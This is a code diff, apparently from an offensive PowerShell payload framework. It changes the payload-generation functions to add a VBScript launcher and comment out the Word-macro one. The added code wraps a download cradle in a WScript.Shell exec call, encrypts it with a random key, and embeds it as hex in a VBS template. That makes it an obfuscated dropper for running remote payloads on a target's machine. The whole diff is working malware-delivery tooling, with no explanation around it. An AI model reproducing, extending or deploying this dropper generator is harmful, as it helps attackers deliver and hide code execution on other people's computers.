@@ -36,8 +36,8 @@ def create_filename(args):
         'dotnetexe-64bit',
     ]:
         result += '.exe'
-    else:
-        result += '.docm'
+    elif args['GroupLauncher'] == 'vbs':
+        result += ".vbs"
     return result
 
 
@@ -47,7 +47,8 @@ def create_payload(args):
         "mingw32-64bit": create_exe,
         "dotnetexe-32bit": create_dotnet,
         "dotnetexe-64bit": create_dotnet,
-        "wordmacro": create_docx,
+        "vbs": create_vbs,
+        #  "wordmacro": create_docx,
         #  "rundll32": create_exe,
         #  "installutil": create_exe,
     }
@@ -58,13 +59,15 @@ def create_vbs(args):
     filename = create_filename(args)
     args = dict(args)  # convert from immutable dict
     args['GroupLauncher'] = 'cmd_enc'
-    cmd = build_cradle(args)
+    cmd = build_cradle(args).replace('\n', '')
+    cmd = ('CreateObject("WScript.Shell").' +
+           'exec("%s")') % cmd
     key = generate_random_key(16)
     cmd = encrypt(cmd.encode(), key)
     vbs_code = load_template(
         'powerhub.vbs',
         HEX_CODE=' '.join('%02X' % c for c in cmd),
-        HEX_KEY=' '.join('%02X' % c for c in key),
+        HEX_KEY=' '.join('%02X' % ord(c) for c in key),
         symbol_name=symbol_name,
     )
     return filename, vbs_code
